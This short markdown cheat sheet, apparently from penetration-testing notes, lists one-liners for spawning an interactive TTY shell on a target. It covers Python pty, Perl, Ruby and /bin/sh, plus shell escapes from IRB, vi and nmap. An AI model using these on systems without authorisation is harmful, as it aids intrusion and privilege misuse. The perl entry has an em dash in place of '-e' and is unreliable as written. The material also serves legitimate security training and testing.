# TTY-Shell
Here are some commands which will allow you to spawn a tty shell. Obviously some of this will depend on the system environment and installed packages.
# match the target system
## Shell Spawning
- `python -c 'import pty; pty.spawn("/bin/bash")'`
- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `perl —e 'exec "/bin/sh";'`
- `perl: exec "/bin/sh";`
- `ruby: exec "/bin/sh"`
## (From within IRB)
- `exec "/bin/sh"`
## (From within vi)
- `:!bash`
- `:set shell=/bin/bash:shell`
## (From within nmap)
- `!sh`
